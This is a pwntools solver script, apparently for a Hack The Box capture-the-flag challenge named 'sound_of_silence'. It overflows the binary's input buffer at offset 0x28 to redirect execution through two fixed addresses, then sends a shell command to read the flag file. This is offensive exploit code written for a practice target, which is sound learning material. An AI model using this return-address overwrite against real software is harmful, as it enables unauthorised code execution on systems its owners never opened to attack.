#!/usr/bin/python3.8
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

fname = './sound_of_silence' 

LOCAL = True

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

e = ELF(fname)

payload = flat({0x28: p64(0x401060) + p64(0x401050)})

r.sendlineafter('>> ', payload)

r.sendline('cat glag*')

print(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}\n')
